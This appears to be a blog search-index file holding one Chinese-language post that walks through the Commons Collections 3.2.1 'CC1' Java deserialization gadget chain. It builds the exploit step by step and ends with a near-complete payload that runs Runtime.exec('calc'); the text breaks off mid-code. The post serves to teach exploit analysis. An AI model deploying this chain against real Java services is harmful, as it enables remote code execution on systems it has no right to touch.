<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java cc1链简单分析</title>
      <link href="/2022/04/08/java-fan-xu-lie-hua-cc1/"/>
      <url>/2022/04/08/java-fan-xu-lie-hua-cc1/</url>
      
        <content type="html"><![CDATA[<h2 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h2><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>jdk：1.7.0_10  <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><p>CommonsCollections：3.2.1</p><p>分析的时候需要sun源码：<a href="https://sourceforge.net/projects/jdk7src/files/">https://sourceforge.net/projects/jdk7src/files/</a></p><p>pom.xml中写入，更新maven</p><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span></code></pre><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p><img src="https://bu.dusays.com/2022/04/08/8a0298e3654b4.png"></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Transformer就是变形金刚的英文名，是一个接口，定义了transform方法，实现类可以对对象进行一些操作。可以理解为一个装饰器或者代理</p><p><img src="https://bu.dusays.com/2022/04/08/59ecd7233211e.png"></p><p>然后接下来要用到的类</p><p>● ConstantTransformer：它的transform()返回一个常量，也就是new时接收到的对象</p><p>● ChainedTransformer：它的transform()会链式调用上一个元素的transform()，也就是new时传进来的对象数组，前一个输出作为后一个输入</p><p>● InvokerTransformer：它的transform()会反射调用对象的方法，参数都可控</p><p>● TransformedMap</p><p>​    Map类是存储键值对的数据结构。 Apache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加&#x2F;删除&#x2F;或是被修改时，会调用transform方法自动进行特定的修饰变换，具体的变换逻辑由Transformer类定义。</p><p>​    Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过Java的反射机制来调用任意函数，叫做InvokerTransformer。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>如果是想挖掘一个反序列化的链子，那一般先找有危险方法的类，然后去构造链子</p><p>该链子是InvokerTransformer.transform()方法会反射加载任意类（可控）</p><p>接下来就一步一步弹计算器</p><p>首先我们用InvokerTransformer.transform()：</p><pre class=" language-java"><code class="language-java">        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"calc"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        invokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>找到会调用transform()的类，这里用TransformedMap类，它的checkSetValue()会调用transform()，但checkSetValue()是protect，仔细看可以发现TransformedMap是AbstractInputCheckedMapDecorator的子类</p><p>AbstractInputCheckedMapDecorator它的内部类MapEntry的setValue()方法调用了checkSetValue()，然后就可以用父类去访问子类的checkSetValue()</p><p>所以找哪里调用了setValue()，AnnotationInvocationHandler.readObject()调用了setValue()，但这个类是default类型的，需要反射</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"calc"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">,</span><span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap <span class="token operator">=</span> TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        for(Map.Entry entry:transformedMap.entrySet())&amp;#123;</span><span class="token comment" spellcheck="true">//            entry.setValue(runtime);</span><span class="token comment" spellcheck="true">//        &amp;#125;  </span><span class="token comment" spellcheck="true">//这里可以理解一下，一个Entry就是HashMap遍历时的一个键值对，我们可以遍历HashMap，调用setValue()，但cc1还得用AnnotationInvocationHandler</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformerdmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream os<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileInputStream fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>这样构造好了，但是反序列化是不成功的，目前构造的链有三个问题</p><p>● 之前我们的Runtime都是自己生成的，然而Runtime是不能被序列化的</p><p>● 在AnnotationInvocationHandler的readObject()中想要执行到setValue()是有if条件判断的</p><p>● AnnotationInvocationHandler.readObject()里面的setValue()里面的transform是不可控的</p><p>先解决第一个问题：</p><p>Class是可以被序列化的</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//        Class c = Runtime.class;</span><span class="token comment" spellcheck="true">//        Method getruntimemethod = c.getMethod("getRuntime",null);</span><span class="token comment" spellcheck="true">//        Runtime r = (Runtime) getruntimemethod.invoke(null,null);</span><span class="token comment" spellcheck="true">//        Method getexecmethod = c.getMethod("exec",String.class);</span><span class="token comment" spellcheck="true">//        getexecmethod.invoke(r,"calc");  </span><span class="token comment" spellcheck="true">// Runtime.getRuntime().exec()反射</span><span class="token comment" spellcheck="true">//        Method getruntimemethod = (Method) new InvokerTransformer("getMethod",new Class[]&amp;#123;String.class,Class[].class&amp;#125;,new Object[]&amp;#123;"getRuntime",null&amp;#125;).transform(Runtime.class);</span><span class="token comment" spellcheck="true">//       Runtime getinvokemethod = (Runtime) new InvokerTransformer("invoke",new Class[]&amp;#123;Object.class,Object[].class&amp;#125;,new Object[]&amp;#123;null,null&amp;#125;).transform(getruntimemethod);</span><span class="token comment" spellcheck="true">//        new InvokerTransformer("exec",new Class[]&amp;#123;String.class&amp;#125;,new Object[]&amp;#123;"calc"&amp;#125;).transform(getinvokemethod);  </span><span class="token comment" spellcheck="true">// InvokerTransformer的Runtime.getRuntime().exec()反射</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>null<span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"calc"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        ChainedTransformer chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 可以用ChainedTransformer来递归</span></code></pre><p>第二个问题：</p><p>第一个if()会判断注解的成员变量的类型（需要找到一个有成员变量的注解），第二个if()会判断成员变量的值是否可以强转为成员变量的类型（这个不成立的）</p><pre class=" language-java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">,</span><span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">></span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 第一个if是根据ertry的键判断的</span>Object obj <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformerdmap<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">></span>Object obj <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformerdmap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Target注解有个value值</span></code></pre><p>第三个问题：</p><p>可以利用ConstantTransformer这个类</p><pre class=" language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>null<span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"calc"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><p>最后完整的代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @data: 2022 * @author: Lees * @since: JDK 11 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>null<span class="token punctuation">,</span>null<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"calc"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        ChainedTransformer chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformerdmap <span class="token operator">=</span> TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>            Class <span class="token class-name">c</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span 